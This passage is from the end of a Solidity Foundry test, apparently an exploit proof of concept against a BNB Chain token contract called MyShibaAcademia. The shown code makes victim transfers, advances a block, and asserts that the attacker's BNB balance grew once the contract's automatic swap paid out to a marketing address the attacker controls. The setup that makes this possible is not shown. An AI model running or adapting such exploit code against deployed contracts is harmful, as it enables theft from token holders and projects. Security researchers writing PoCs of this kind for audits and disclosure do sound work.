            // Need more transfers
            vm.prank(victim);
            MyShibaAcademia(TARGET).transfer(address(0xAAA), 100_000 * 10**9);
        }

        // Give time for swap to complete
        vm.roll(block.number + 1);

        // Check if contract has BNB (it should have swapped tokens for BNB)
        uint256 contractBNB = address(TARGET).balance;
        console.log("Contract BNB balance:", contractBNB);

        // The contract should have sent BNB to marketing address (attacker)
        // But let's check if we need to trigger the transfer
        // Actually, transferToAddressBNB is called in swapTokens, so it should happen automatically

        // Check attacker's BNB balance
        uint256 finalBalance = address(attacker).balance;
        console.log("Attacker BNB balance before:", initialBalance);
        console.log("Attacker BNB balance after:", finalBalance);

        // Verify exploit succeeded
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should have increased");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

